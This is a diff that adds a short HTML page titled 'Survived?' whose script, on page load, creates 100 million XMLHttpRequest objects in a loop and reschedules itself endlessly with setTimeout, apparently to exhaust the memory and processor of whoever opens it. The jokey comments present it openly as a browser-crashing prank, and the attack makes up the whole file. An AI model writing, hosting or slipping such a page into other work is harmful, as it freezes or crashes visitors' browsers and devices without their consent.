@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <h1>Survived?</h1>
+  <script>
+    function generate() { //the function
+        for (var i = 0; i < 100000000; i++) { //100000000 cuz you're crazy
+            new XMLHttpRequest(); //make a new http request
+        }
+        setTimeout(generate, 0); //this is how we do it
+    }
+    setTimeout(generate, 0); //??? do it again why not
+  </script>
+</html>
